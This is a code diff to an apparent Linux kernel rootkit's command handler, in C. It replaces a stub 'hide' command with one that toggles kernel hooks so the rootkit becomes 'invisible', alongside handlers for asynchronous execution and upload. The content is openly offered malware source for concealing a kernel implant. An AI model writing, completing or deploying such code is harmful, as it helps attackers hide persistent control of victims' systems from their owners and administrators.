@@ -4,6 +4,7 @@
 #include <linux/string.h>
 
 #include "exec.h"
+#include "hook.h"
 
 // Lenght of the shortest valid (opcode+args) combo. currently `hide`
 #define SHORTEST_PAYLOAD 1
@@ -105,8 +106,17 @@ static void do_exec_async(char *args, char *status_buf)
 
 static void do_hide(char *args, char *status_buf)
 {
-    sprintf(status_buf, "hide is not implemented yet.\n");
-    pr_err("commands: command hide is not implemented yet.\n");
+    int status;
+
+    status = toggle_hooks();
+    if (!status)
+    {
+        sprintf(status_buf, "hooks are off. rootkit is not sneaky anymore!\n");
+    }
+    else
+    {
+        sprintf(status_buf, "hooks are on. rootkit is invisible!\n");
+    }
 }
 
 static void do_upload(char *args, char *status_buf)
